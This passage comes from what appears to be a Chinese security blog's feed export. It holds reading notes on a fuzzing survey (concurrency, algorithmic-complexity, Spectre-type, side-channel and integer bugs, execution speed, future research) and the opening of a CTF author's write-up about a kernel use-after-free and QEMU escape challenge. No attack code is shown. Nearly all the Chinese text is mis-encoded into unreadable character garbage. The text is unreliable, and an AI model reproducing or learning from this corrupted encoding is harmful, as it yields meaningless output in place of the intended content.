Bugsï¼‰åœ¨ç¨‹åºæ²¡æœ‰åˆé€‚çš„åŒæ­¥æœºåˆ¶æˆ–è¿è¡Œé¡ºåºæ—¶å‘ç”Ÿï¼Œé€šå¸¸å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>æ­»é”å‹æ¼æ´</strong>ï¼ˆdeadlock bugsï¼‰ï¼šç­‰å¾…èµ„æºé‡Šæ”¾ï¼ˆå¦‚é”ï¼‰</li><li><strong>éæ­»é”å‹æ¼æ´</strong>ï¼ˆnon-deadlock bugsï¼‰<ul><li>åŸå­æ€§æŸåå‹ï¼ˆatomicity-violationï¼‰ï¼šç ´åäº†æŸä¸€ä»£ç åŒºåŸŸçš„ <em>æœŸæœ›åºåˆ—æ€§</em> ï¼ˆdesired serializabilityï¼‰ï¼Œå¦‚ Fig.8a æ‰€ç¤ºçš„ <code>Thread 1</code> ç¬¬ä¸‰è¡Œé‡Šæ”¾äº† <code>p-&gt;info</code>ï¼Œ<code>Thread 2</code> çš„ç¬¬äºŒè¡Œå°† <code>p-&gt;info</code> ç½®ä¸º NULLï¼Œä»è€Œå¼•å‘é”™è¯¯</li><li>é¡ºåºå‹ï¼ˆorderï¼‰æ¼æ´ï¼šä»¥é”™è¯¯çš„é¡ºåºå¯¹å†…å­˜åŒºåŸŸè¿›è¡Œè®¿é—®ï¼Œå¦‚ Fig.8b ä¸­ <code>Thread 2</code> åœ¨ <code>mThd</code> è¢«åˆå§‹åŒ–å‰å¯¹ <code>mState</code> èµ‹å€¼ï¼Œè¿™ä¼šé€ æˆæœªåˆå§‹åŒ–å˜é‡å¼•ç”¨æ¼æ´</li></ul></li></ul><blockquote><p><del>çœŸçš„æœ‰äººä¼šè¿™ä¹ˆå†™ä»£ç ğŸ</del></p></blockquote><p><img src="https://s2.loli.net/2022/10/30/AfHSLXUPDItFRqB.png" alt="image.png"></p><p>å‘ç°æ­»é”æ¼æ´çš„ä¸€ä¸ªæ–¹æ³•æ˜¯åœ¨ <em>é”é¡ºåºå›¾</em> ï¼ˆlock order graphï¼‰ä¸Šæ£€æµ‹ä»£è¡¨æ­»é”çš„ç¯ï¼ˆcyclesï¼‰</p><blockquote><p>è®ºæ–‡ä¸¾äº†è¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://ieeexplore.ieee.org/document/6227156/">MagicFuzzer</a>ï¼š ä¸ºäº†æé«˜æ•ˆç‡ï¼Œå…¶ä¼šç§»é™¤ä¸åœ¨ä»»ä½•ç¯ä¸­çš„é”ï¼Œå¹¶æ£€æŸ¥å‰©ä½™çš„ç¯</li><li><a href="https://dl.acm.org/doi/abs/10.1145/1453101.1453121">ATOMFUZZER</a>ï¼šå¯¹äºåŸå­æ€§ç ´åï¼Œå…¶ä¼šè§‚æµ‹åŸå­å—å†…çš„é”è¢«ä¸¤ä¸ªçº¿ç¨‹é‡å¤è¯·æ±‚ä¸é‡Šæ”¾çš„æ¼æ´æ¨¡å¼</li><li><a href="https://dl.acm.org/doi/10.1145/1321631.1321679">CalFuzzer</a>ï¼šè¿‡å¤šçš„çº¿ç¨‹äº¤é”™ï¼ˆinterleavingï¼‰å¸¦æ¥çŠ¶æ€çˆ†ç‚¸ï¼ˆstate-explosionï¼‰ï¼Œå…¶åŸºäºäº¤é”™çš„ç­‰ä»·æ€§ç¼“è§£çŠ¶æ€çˆ†ç‚¸</li></ul></blockquote><h3 id="5-2-3-Algorithmic-Complexity"><a href="#5-2-3-Algorithmic-Complexity" class="headerlink" title="5.2.3 Algorithmic Complexity"></a>5.2.3 Algorithmic Complexity</h3><p><strong>ç®—æ³•å¤æ‚æ€§</strong>ï¼ˆAlgorithm Complexityï¼ŒACï¼‰æ¼æ´æ˜¯ç®—æ³•åœ¨æœ€åæƒ…å†µä¸‹ä¼šæ˜¾è‘—çš„é™ä½æ€§èƒ½ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDenial-of-Serviceï¼‰æ”»å‡»ï¼ŒFig.9 å±•ç¤ºäº†ä¸€ä¸ªæœ‰ç€ä¸åŒç®—æ³•å¤æ‚åº¦çš„ä¾‹å­ï¼Œåœ¨æœ€åæƒ…å†µä¸‹å¯ä»¥è¢«æ”»å‡»è€…ç”¨ä½œ DoS  æ”»å‡»ï¼š</p><p><img src="https://s2.loli.net/2022/10/30/mYhDVBvyeSzcrix.png" alt="Fig. 9. Algorithm complexity"></p><blockquote><p>è®ºæ–‡ä¸¾äº†ä»¥ä¸‹ä¾‹å­ï¼š</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134073">SlowFuzz</a>ï¼šé€šè¿‡ç”Ÿæˆå¢åŠ æ‰§è¡ŒæŒ‡ä»¤æ•°é‡çš„è¾“å…¥æ¥å‘ç° AC æ¼æ´</li><li><a href="https://www.ndss-symposium.org/ndss-paper/hotfuzz-discovering-algorithmic-denial-of-service-vulnerabilities-through-guided-micro-fuzzing/">HotFuzz</a>ï¼šé€šè¿‡æœ€å¤§åŒ–å•ä¸ªæ–¹æ³•çš„æ¶ˆè€—æ¥æ£€æµ‹ Java ä¸­çš„ AC æ¼æ´</li><li><a href="https://ieeexplore.ieee.org/document/9284141/">MemLock</a>ï¼šé€šè¿‡è¾¹è¦†ç›–ç‡ä¸å†…å­˜æ¶ˆè€—æ¥æ£€æµ‹ AC æ¼æ´</li><li><a href="https://dl.acm.org/doi/10.1145/3236024.3236039">Singularity</a>ï¼šåŸºäº <em>æœ€åè¡¨ç°è¾“å…¥</em> ï¼ˆæˆ‘è®¤è¯†ä»– performance inputï¼ŒWPIï¼‰æ€»æ˜¯éµå¾ªæŸç§ç‰¹å®šæ¨¡å¼æ¥åˆæˆè¾“å…¥ç”Ÿæˆç¨‹åº</li></ul></blockquote><h3 id="5-2-4-Spectre-type-Bugs"><a href="#5-2-4-Spectre-type-Bugs" class="headerlink" title="5.2.4 Spectre-type Bugs"></a>5.2.4 Spectre-type Bugs</h3><p><strong>å¹½çµå‹æ¼æ´</strong>ï¼ˆSpectre-type Bugsï¼‰æ˜¯ä¸€ç§åˆ©ç”¨é”™è¯¯åˆ†æ”¯é¢„æµ‹ï¼ˆmispredicted branch speculationsï¼‰æ¥æ§åˆ¶å†…å­˜è®¿é—®çš„å¾®æ¶æ„æ”»å‡»ï¼Œä¾‹å¦‚åœ¨ Fig.10 ä¸­æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœ‰æ•ˆå€¼æ¥è®­ç»ƒåˆ†æ”¯é¢„æµ‹ä¸ºçœŸï¼Œéšåç»™å˜é‡ä¸€ä¸ª OOB çš„å€¼ï¼Œæ­¤æ—¶é¢„æµ‹å™¨ä¾¿ä¼šé”™è¯¯é¢„æµ‹åˆ†æ”¯è¡Œä¸ºï¼Œä»è€Œé”™è¯¯åœ°æ‰§è¡Œäº†ç¬¬3ã€4è¡Œä»£ç ï¼Œé€ æˆäº†è¶Šç•Œè¯»å–</p><p><img src="https://s2.loli.net/2022/10/30/LJsx8WOUQyP2koA.png" alt="Fig. 10. Spectre-type bug"></p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/oleksenko">SpecFuzz</a>ï¼Œ<del>ä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥å™±å¤´å¤§äºå®é™…</del></p></blockquote><h3 id="5-2-5-Side-channels"><a href="#5-2-5-Side-channels" class="headerlink" title="5.2.5 Side channels"></a>5.2.5 Side channels</h3><p><strong>ä¾§ä¿¡é“æ¼æ´</strong>ï¼ˆside-channelï¼‰é€šè¿‡å¯¹ç³»ç»Ÿçš„éåŠŸèƒ½æ€§è¡¨ç°ï¼ˆä¾‹å¦‚æ‰§è¡Œæ—¶é—´ï¼‰æ¥æ³„éœ²ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡åˆ†æ”¯æ‰§è¡Œæ—¶é—´åˆ¤æ–­æ‰§è¡Œçš„åˆ†æ”¯</p><blockquote><p>è®ºæ–‡æ²¡ç»™ä¾‹å­ï¼Œé‚£ç¬”è€…ç»™å‡ºä¸€ä¸ªä¾‹å­ï¼š<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>ï¼ˆ<del>ä¸æ‡‚å’‹ç¿»</del>ï¼‰æ˜¯ä¸€ç§ç”±å³æ—¶ä¼˜åŒ–ï¼ˆJust-In-Time Optimizationï¼‰å¯¼è‡´çš„ç‰¹æ®Šä¾§ä¿¡é“ï¼Œç±»ä¼¼äºå¹½çµå‹æ¼æ´ï¼Œé€šè¿‡è®­ç»ƒ JIT ç¼–è¯‘å™¨ä¼˜åŒ–å•ä¸€åˆ†æ”¯ä»¥ä½¿å¾—ä¸¤æ‰§è¡Œåˆ†æ”¯é—´æ‰§è¡Œæ—¶é—´å·®å¤§åˆ°å¯ä»¥è¢«è§‚æµ‹åˆ°</p><h3 id="5-2-6-Integer-Bugs"><a href="#5-2-6-Integer-Bugs" class="headerlink" title="5.2.6 Integer Bugs"></a>5.2.6 Integer Bugs</h3><p><strong>æ•´å‹ä¸Šæº¢&#x2F;ä¸‹æº¢</strong>ï¼ˆInteger Overflow&#x2F;Underflowï¼‰åœ¨ç®—æœ¯è¡¨è¾¾å¼çš„å€¼è¶…è¿‡æœºå™¨ç±»å‹æ‰€å†³å®šçš„èŒƒå›´æ—¶å‘ç”Ÿï¼Œæˆ–æ˜¯åœ¨æ•´å‹é—´è½¬æ¢æ—¶å‘ç”Ÿï¼ˆæ¯”å¦‚ int to uintï¼‰</p><blockquote><p>è®ºæ–‡ä¸¾äº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h2 id="5-3-Improvement-of-Execution-Speed"><a href="#5-3-Improvement-of-Execution-Speed" class="headerlink" title="5.3 Improvement of Execution Speed"></a>5.3 Improvement of Execution Speed</h2><p>æ‰§è¡Œé€Ÿåº¦å¯¹æ¨¡ç³Šæµ‹è¯•è€Œè¨€éå¸¸å…³é”®ï¼Œæ›´é«˜çš„æ‰§è¡Œé€Ÿåº¦æ„å‘³ç€åœ¨åŒä¸€æ—¶é—´èƒ½è·‘æ›´å¤šæµ‹è¯•ç”¨ä¾‹ï¼Œä»è€Œæé«˜å‘ç°ç¼ºé™·çš„æœºä¼š</p><h3 id="5-3-1-Binary-Analysis"><a href="#5-3-1-Binary-Analysis" class="headerlink" title="5.3.1 Binary Analysis"></a>5.3.1 Binary Analysis</h3><p><strong>é™æ€æ’æ¡©</strong>ï¼ˆstatic instrumentationï¼‰æ˜¯ä¸»æµçš„è·å–æ‰§è¡ŒçŠ¶æ€çš„æ–¹å¼ï¼Œå› ä¸ºå…¶ä¸º fuzzing æä¾›äº†æ›´é«˜çš„æ‰§è¡Œé€Ÿåº¦</p><ul><li><p>å¯¹å¼€æºç¨‹åºè€Œè¨€ï¼Œä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„é™æ€åˆ†æå·¥å…·æ˜¯ <code>LLVM</code>ï¼Œå…¶åœ¨ç¼–è¯‘æœŸè¿›è¡Œæ’æ¡©</p></li><li><p>å¯¹äºé—­æºç¨‹åºè€Œè¨€ï¼Œfuzzer è¢«é™åˆ¶äºäºŒè¿›åˆ¶åˆ†æï¼Œä½†äºŒè¿›åˆ¶æ’æ¡©å·¥å…·æœ‰ç€ä¸è²çš„è¿è¡Œæ—¶å¼€é”€</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://ieeexplore.ieee.org/document/9152762">RetroWrite</a> ä½¿ç”¨åŸºäºå¯é‡æ±‡ç¼–çš„æ±‡ç¼–ï¼ˆreassembleable assemblyï¼‰çš„é™æ€äºŒè¿›åˆ¶é‡å†™æŠ€æœ¯ï¼Œå…¶å…³æ³¨äºä½¿ç”¨ 64 ä½çš„ <em>åœ°å€æ— å…³ä»£ç </em> ï¼ˆposition independent codeï¼ŒPICï¼‰çš„é‡å®šä½ä¿¡æ¯æ¥æ’æ¡©æ±‡ç¼–ç¨‹åº</li><li><a href="https://www.usenix.org/conference/usenixsecurity21/presentation/nagy">FIBRE</a> é€šè¿‡å››ä¸ªä¿®æ”¹ä¸­é—´è¡¨ç¤ºçš„é˜¶æ®µï¼ˆIR-modifying phaseï¼‰æ¥æµæ°´çº¿åŒ–æ’æ¡©</li><li><a href="https://ieeexplore.ieee.org/document/9519407">STOCHFUZZ</a> é€šè¿‡å¤šæ¬¡é‡å†™æ¥è§£å†³æ­¤å‰é‡å†™çš„é—ç•™é—®é¢˜</li></ul></blockquote></li></ul><h3 id="5-3-2-Execution-Process"><a href="#5-3-2-Execution-Process" class="headerlink" title="5.3.2 Execution Process"></a>5.3.2 Execution Process</h3><p>æ‰§è¡Œé€Ÿåº¦åŒæ ·å¯ä»¥åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­æå‡ï¼Œä¾‹å¦‚ <a href="https://ieeexplore.ieee.org/document/8835316">UnTracer</a> è§‚æµ‹åˆ°å¤§éƒ¨åˆ†æµ‹è¯•ç”¨ä¾‹å¹¶ä¸ä¼šå¸¦æ¥æ–°çš„è¦†ç›–ç‡ï¼Œç”±æ­¤å…¶ä»…è¿½è¸ªä¼šå¢åŠ è¦†ç›–ç‡çš„æµ‹è¯•ç”¨ä¾‹</p><blockquote><p>è®ºæ–‡è¿˜ç»™å‡ºè¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://ieeexplore.ieee.org/document/9139349/">CSI-Fuzz</a> ä½¿ç”¨è¾¹è¦†ç›–ç‡æ¥æ”¹è¿› UnTracerï¼Œå› ä¸ºå—è¦†ç›–ç‡ä¸§å¤±äº†æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯</li><li><a href="https://ieeexplore.ieee.org/document/9286017">Zeror</a> é€šè¿‡åœ¨ UnTracer  æ’æ¡©ä¸ AFL æ’æ¡©é—´åˆ‡æ¢æ¥æ”¹è¿› UnTracer</li></ul></blockquote><p>å¯¹äºæ··åˆæ¨¡ç³Šæµ‹è¯•ï¼Œæ··åˆæ‰§è¡Œè¢«ç”¨ä»¥æ±‚è§£è·¯å¾„çº¦æŸï¼Œä½†ç¬¦å·æ‰§è¡Œåœ¨è¡¨ç¤ºè·¯å¾„çº¦æŸä¸Šè¾ƒæ…¢ï¼Œ<a href="">QSYM</a> é€šè¿‡ç§»é™¤ä¸€äº›è€—æ—¶çš„å†…å®¹ï¼ˆIR ç¿»è¯‘ã€å¿«ç…§ç­‰ï¼‰æ¥ç¼“è§£æ€§èƒ½ç“¶é¢ˆ</p><blockquote><p>è®ºæ–‡è¿˜ç»™å‡ºè¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3319535.3354249">Intriguer</a> è§‚æµ‹åˆ° QSYM ä»æ±‚è§£ä¸å¿…è¦çº¦æŸå¯¼è‡´çš„æ€§èƒ½è¯„ä»·ï¼Œå› æ­¤å…¶ä½¿ç”¨ç¬¦å·æ‰§è¡Œç”±åŠ¨æ€æ±¡ç‚¹åˆ†æç¡®è®¤çš„æ›´ç›¸å…³æŒ‡ä»¤</li><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134046">Xu</a> å‘ç° AFL åœ¨å¹¶è¡Œè·‘ 120 æ ¸æ—¶æ˜¾è‘—å˜æ…¢ï¼Œæ•…å…¶è®¾è®¡äº†æ–°çš„æ“ä½œåŸè¯­ï¼ˆoperating primitivesï¼‰æ¥æå‡æ‰§è¡Œé€Ÿåº¦</li></ul></blockquote><h3 id="5-3-3-Various-Applications"><a href="#5-3-3-Various-Applications" class="headerlink" title="5.3.3 Various Applications"></a>5.3.3 Various Applications</h3><p>æ¨¡ç³Šæµ‹è¯•è¢«ç”¨ä»¥æ£€æµ‹å¤šç§ç›®æ ‡ä¸­çš„ç¼ºé™·ï¼Œå¦‚ IoTã€OS kernelã€VMM ç­‰ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ç‰¹æ€§è¿›è¡Œå®¢åˆ¶åŒ–</p><blockquote><p>è®ºæ–‡ç»™å‡ºè¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">FIRM-AFL</a> é€šè¿‡ç»“åˆç”¨æˆ·æ€æ¨¡æ‹Ÿä¸å…¨ç³»ç»Ÿæ¨¡æ‹Ÿæ¥ç¼“è§£ä¼ ç»Ÿ IOT å›ºä»¶ fuzzing ä¸­å…¨ç³»ç»Ÿæ¨¡æ‹Ÿå¸¦æ¥çš„è™šæ‹Ÿåœ°å€ä¸å†…å­˜è®¿é—®é—´ç¿»è¯‘åŠæ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨çš„å¼€é”€</li><li>Schumilo è®¾è®¡äº†ä¸€ç§<a href="https://www.ndss-symposium.org/ndss-paper/hyper-cube-high-dimensional-hypervisor-fuzzing/">å®¢åˆ¶åŒ– OS</a> ä¸<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/schumilo">å¿«é€Ÿå¿«ç…§å­˜å‚¨æœºåˆ¶</a></li><li>ã€‚ã€‚ã€‚</li></ul></blockquote><blockquote><p><strong>Gap 3</strong>ï¼šå¯¹åº”ç”¨çš„è‡ªåŠ¨åŒ–æ‰§è¡ŒåŸºäºå¯¹å…¶çš„æ·±å…¥ç†è§£ï¼Œåœ¨è®¾è®¡è‡ªåŠ¨è®°å½•å®‰å…¨ç¼ºé™·çš„ indicators æ—¶éœ€è¦é¦–å…ˆç ”ç©¶è¿™äº›ç¼ºé™·çš„ç‰¹æ€§</p></blockquote><h1 id="0x06-DIRECTIONS-OF-FUTURE-RESEARCH"><a href="#0x06-DIRECTIONS-OF-FUTURE-RESEARCH" class="headerlink" title="0x06. DIRECTIONS OF FUTURE RESEARCH"></a>0x06. DIRECTIONS OF FUTURE RESEARCH</h1><p>æœ¬èŠ‚æ€»ç»“äº† fuzzing æœªæ¥çš„ç ”ç©¶æ–¹å‘</p><ul><li><strong>More sensitive fitness</strong>ï¼šç ”ç©¶äººå‘˜æ„è¯†åˆ°ä»£ç è¦†ç›–åœ¨å‘ç°å¤æ‚æ¼æ´ä¸Šå­˜åœ¨å±€é™æ€§ï¼Œå› æ­¤å…¶é€šè¿‡å¼•å…¥ç”±åˆ†ææ¼æ´è·å¾—çš„ä¿¡æ¯æ¥æ”¹è¿›ä»£ç è¦†ç›–ã€‚æœªæ¥çš„å·¥ä½œå¯ä»¥æ˜¯åŸºäºæ¼æ´ç‰¹æ€§åˆ†æä¸æ£€æµ‹æ¼æ´ï¼Œå°¤å…¶æ˜¯åˆ†æé‚£äº› fuzzing æœªåˆ†æå‡ºçš„æ¼æ´</li><li><strong>More sophisticated fuzzing theory</strong>ï¼šç»å¤§éƒ¨åˆ†ç°æœ‰çš„å·¥ä½œéƒ½è‡´åŠ›äºç§å­è°ƒåº¦ä¸Šï¼Œä»…å°‘éƒ¨åˆ†å·¥ä½œå…³æ³¨äº fuzzing çš„å…¶ä»–è¿‡ç¨‹ã€‚å¯¹æ•´ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹è¿›è¡Œæ•°å­¦åŒ–æ„å»ºå¹¶éå°äº‹ï¼Œä½†æ„å»ºå¤šä½™ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹æ˜¯å¯èƒ½çš„ï¼Œä¾‹å¦‚ Game Theory ä¾¿åŒæ—¶è€ƒè™‘äº†ç§å­è°ƒåº¦ä¸å­—èŠ‚è°ƒåº¦ã€‚ä¸€ä¸ªæ›´å¤§çš„å›¾æ™¯æ˜¯å…³äºæ¨¡ç³Šæµ‹è¯•çš„ç†è®ºå±€é™ï¼ˆä¾‹å¦‚ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„å±€é™ï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼Œä½¿ç”¨å¤šç§ç±»å‹çš„ fitness æ„å»º fuzzing è¿‡ç¨‹æ˜¯å¦ä¸€ç§åˆ›å»ºæ›´å…ˆè¿› fuzzing ç†è®ºçš„æ–¹å¼ï¼Œä¾‹å¦‚æœªæ¥çš„å·¥ä½œå¯èƒ½æ„å»ºåŒæ—¶è€ƒè™‘æ¼æ´å‡ºç°ä¸çŠ¶æ€è½¬ç§»çš„ fuzzing è¿‡ç¨‹</li><li><strong>Sound evaluation</strong>ï¼šä¸€éƒ¨åˆ†å·¥ä½œå…³æ³¨äºè¯„ä¼°çš„å¯é æ€§ï¼ˆsoundness of evaluationï¼‰ï¼Œä½†æ²¡æœ‰æ˜ç¡®ç»“è®ºï¼ˆÂ§3.6ï¼‰ï¼Œæœ‰æ›´å¤šçš„é—®é¢˜å¾…æˆ‘ä»¬è§£ç­”ï¼šåœ¨è¯„ä¼°è¯­æ–™åº“ä¸­è¯¥ä½¿ç”¨çœŸå®æ¼æ´è¿˜æ˜¯åˆæˆæ¼æ´ï¼Ÿé™æ€æµ‹è¯•æ˜¯åŒºåˆ†ä¸åŒ fuzzing æŠ€æœ¯çš„æœ€ç»ˆç­”æ¡ˆğŸï¼Ÿåˆç†çš„ time budget åº”å½“æ˜¯ï¼Ÿå¦‚ä½•åœ¨æ²¡æœ‰å…¶ä»–å¯æ¯”è¾ƒ fuzzer çš„æƒ…å†µä¸‹è¯„ä¼°ç‰¹æ®Šç›®æ ‡ï¼ˆå¦‚ç¡¬ä»¶ï¼‰ï¼Ÿ</li><li><strong>Scalable input inference</strong>ï¼šè‹¥åœ¨ fuzzing ä¸­èƒ½ä½¿ç”¨æ ¼å¼æˆ–æ•°æ®ä¾èµ–é¡¹åˆ™èƒ½æ˜¾è‘—æé«˜ fuzzing æ•ˆç‡ï¼ˆÂ§4.6&amp;Â§4.7ï¼‰ï¼Œé™æ€åˆ†æè¢«å¹¿æ³›ç”¨äºæ ¼å¼ä¸æ•°æ®ä¾èµ–é¡¹æ¨æ–­ï¼Œä½†å…¶ç‰¹å®šäºç‰¹å®šç¨‹åºï¼Œè€Œæ¨æ–­æ–¹æ¡ˆçš„å®ç°éœ€è¦è€ƒè™‘ä¸åŒåº”ç”¨çš„ç‰¹æ€§ã€‚åŠ¨æ€åˆ†æå…³æ³¨äºæ ¼å¼æ¨æ–­ï¼Œä»…å°‘éƒ¨åˆ†åœ¨æ•°æ®ä¾èµ–é¡¹æ¨æ–­ä¸Šåšäº†å·¥ä½œï¼Œè€Œå…¶æ¯”é™æ€åˆ†ææ›´å¯æ‰©å±•ï¼ˆscalableï¼‰</li><li><strong>Efficient mutation operators</strong>ï¼šå‡ ä¹æ‰€æœ‰ fuzzer éƒ½åœ¨ fuzzing ä¸­ä½¿ç”¨æ··åˆçš„å˜å¼‚å™¨ï¼Œä½†åœ¨ fuzzing ä¸­å¹¶ä¸ä¼šä¿®æ”¹å˜å¼‚å™¨ï¼ˆÂ§4ï¼‰ï¼Œä¸€éƒ¨åˆ†å·¥ä½œåœ¨ä¼˜åŒ–å˜å¼‚å™¨è°ƒåº¦ä¸Šï¼Œä½†æ²¡äººå…³æ³¨äºå¯å˜çš„å˜å¼‚å™¨ï¼ˆÂ§3.4ï¼‰ã€‚ç”±äºå˜å¼‚å™¨è°ƒåº¦ä¸å­—èŠ‚è°ƒåº¦ç´§å¯†å…³è”ï¼Œå¯ä»¥è€ƒè™‘åŸºäºå­—èŠ‚è°ƒåº¦è®¾è®¡å˜å¼‚å™¨ã€‚å¯¹é«˜åº¦ç»“æ„åŒ–è¾“å…¥çš„å˜å¼‚å™¨è°ƒåº¦ä¹Ÿå€¼å¾—ç ”ç©¶</li><li><strong>More types of applications</strong>ï¼šç”±äºåº”ç”¨çš„å¤æ‚æ€§ï¼Œfuzzing åœ¨æ£€æµ‹æ›´å¤šç±»å‹åº”ç”¨ä¸Šæœ‰å…¶å±€é™ï¼Œä¾‹å¦‚ä¸€éƒ¨åˆ†å·¥ä½œæ¢ç´¢äº† fuzz CPSs çš„å¯èƒ½æ€§ï¼Œä½†èƒ½åŠ›é­åˆ°äº†é™åˆ¶ã€‚ç”±äºæ‰§è¡Œé€Ÿåº¦å¯¹ fuzzing è€Œè¨€å¾ˆé‡è¦ï¼Œå› æ­¤å¯¹äºéš¾ä»¥è¢« fuzz çš„ç¨‹åºè€Œè¨€ï¼Œä¸€ä¸ªæ½œåœ¨çš„æ–¹å‘æ˜¯æå‡ä»–ä»¬çš„æ‰§è¡Œé€Ÿåº¦</li><li><strong>More types of bugs</strong>ï¼šfuzzing åœ¨æ£€æµ‹å¦‚å†…å­˜ç ´åã€å¹¶å‘æ¼æ´ã€ç®—æ³•å¤æ‚æ€§æ¼æ´ä¸Šå–å¾—è‰¯å¥½æˆæœï¼ˆÂ§5.2ï¼‰ï¼Œä½†åœ¨æ£€æµ‹å…¶ä»–ç±»å‹æ¼æ´ï¼ˆå¦‚æƒé™æå‡æˆ–é€»è¾‘æ¼æ´ï¼‰ä¸Šä»å­˜åœ¨å›°éš¾ï¼Œéš¾ç‚¹åœ¨äºå¦‚ä½•è®¾è®¡åˆé€‚çš„ indicatorï¼Œè¿™éœ€è¦ç ”ç©¶äººå‘˜åŒæ—¶å¯¹ fuzzing ä¸ç›®æ ‡æ¼æ´æœ‰ç€æ·±åˆ»ç†è§£</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¨¡ç³Šæµ‹è¯•ä¸ºä»€ä¹ˆæ˜¯ç¥&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x07ã€‘ByteCTF2022 byte_run å‡ºé¢˜æ‰‹è®°</title>
    <link href="http://blog.arttnba3.cn/2022/10/01/CTF-0X07-BYTECTF2022_BYTERUN/"/>
    <id>http://blog.arttnba3.cn/2022/10/01/CTF-0X07-BYTECTF2022_BYTERUN/</id>
    <published>2022-09-30T15:48:01.000Z</published>
    <updated>2022-11-23T18:45:06.334Z</updated>
    
    <content type="html"><![CDATA[<p>å‰å¹´ğŸ‘´å½“é€‰æ‰‹çš„æ—¶å€™è¿˜æœ‰â‘¤â­çº§çš„å¸¦ğŸ¨ä½ï¼Œä»Šå¹´å½“å‡ºé¢˜äººğŸ‘´åªèƒ½å–è¥¿åŒ—é£</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ä½œä¸ºä¸€åå®‰å…¨ç ”ç©¶å‘˜ï¼Œç¬”è€…ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿›äº†å­—èŠ‚è·³åŠ¨å½“å¼€å‘ï¼Œäºæ˜¯å°±ä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆè·‘å»å¸® ByteCTF å‡ºé¢˜äº†ï¼ˆç¬‘ï¼‰</p><p>å…¶å®è¿™é“é¢˜æœ€åˆçš„çµæ„Ÿæ¥è‡ªäº Google CTF 2021 çš„ä¸€é“åä¸º â€œfullchainâ€ çš„é¢˜ç›®ï¼Œé‚£æ˜¯ä¸€é“ chrome v8 + mojo sandbox escape + kernel primitive çš„é¢˜ç›®ï¼Œ<strong>ä¸€æ¡éå¸¸å®Œæ•´çš„åˆ©ç”¨é“¾ï¼Œç¬”è€…è§‰å¾—éå¸¸å¸…æ°”</strong>ï¼ˆç¬‘ï¼‰</p><p>ç¬”è€…ä¹Ÿä¸€ç›´æƒ³å‡ºä¸€é“æ¯”è¾ƒã€Œå®Œæ•´ã€ï¼ˆfull chainï¼‰çš„é¢˜ç›®ï¼Œä¸è¿‡é™äºè‡ªèº«æŠ€æœ¯æ°´å¹³è¾ƒä½çš„ç¼˜æ•…å†åŠ ä¸Šè¿™ä¸€æ¬¡çš„å‡ºé¢˜æ—¶é—´æ¯”è¾ƒçŸ­ï¼Œäºæ˜¯åªå¼„å¥½äº†â€œåç«¯åˆ©ç”¨â€çš„éƒ¨åˆ†â€”â€”ã€ŒLinux kernelææƒã€ + ã€ŒQEMUé€ƒé€¸ã€</p><blockquote><p>â€œåç«¯åˆ©ç”¨â€æ˜¯ç¬”è€…ä¸´æ—¶ç”Ÿé€ çš„è¯ï¼Œä»…åœ¨è¿™ç¯‡æ–‡ç« çš„å¼€å¤´è¡¨ç¤ºã€Œæ‹¿åˆ°äº†è¿œç«¯ä»£ç æ‰§è¡Œæƒé™ä¹‹åçš„åˆ©ç”¨éƒ¨åˆ†ã€ï¼ˆç¬‘ï¼‰</p></blockquote><ul><li>kernel éƒ¨åˆ†çš„çµæ„Ÿæ¥è‡ªäº CVE-2022-0847ï¼Œä¹Ÿå°±æ˜¯â€œdirty pipeâ€ï¼Œç¬”è€…æ¨¡ä»¿å†…æ ¸çš„ pipe ç»“æ„è‡ªå·±å†™äº†ä¸€ä¸ªç®€åŒ–ç‰ˆçš„ pipeï¼Œå¹¶ç•™ä¸‹äº†ä¸€ä¸ª UAF 